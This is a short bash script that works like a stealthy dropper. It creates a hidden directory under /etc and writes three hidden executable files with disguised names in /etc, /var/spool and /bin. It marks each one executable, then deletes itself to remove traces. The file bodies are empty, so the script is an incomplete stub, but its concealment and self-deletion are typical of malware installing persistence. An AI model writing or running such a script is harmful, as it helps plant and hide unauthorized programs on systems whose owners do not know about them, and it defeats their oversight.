#!/bin/bash
mkdir /etc/.music
cat <<EOFA > /etc/.music/.skyrim.py

EOFA
chmod +x /etc/.music/.skyrim.py
cat <<EOFB > /var/spool/.log.sh

EOFB
chmod +x /var/spool/.log.sh
cat <<EOFC > /bin/.systemm.sh

EOFC
chmod +x /bin/.systemm.sh
rm -- "$0"
